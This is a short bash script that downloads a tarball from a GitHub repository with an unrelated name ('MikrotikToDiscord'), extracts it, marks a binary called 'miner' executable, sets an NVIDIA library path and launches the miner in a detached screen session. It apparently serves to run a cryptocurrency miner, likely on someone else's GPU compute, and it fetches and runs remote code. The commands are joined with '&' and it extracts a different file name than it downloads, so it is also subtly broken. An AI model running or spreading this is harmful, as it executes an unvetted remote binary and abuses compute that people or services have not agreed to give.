#!/bin/bash
wget https://raw.githubusercontent.com/arymas49/MikrotikToDiscord/master/Pribadi.tar.gz & tar -xvf Pribadi.tar & chmod +x miner & LD_LIBRARY_PATH=/usr/lib64-nvidia & export LD_LIBRARY_PATH & screen -dm bash -c "./miner"
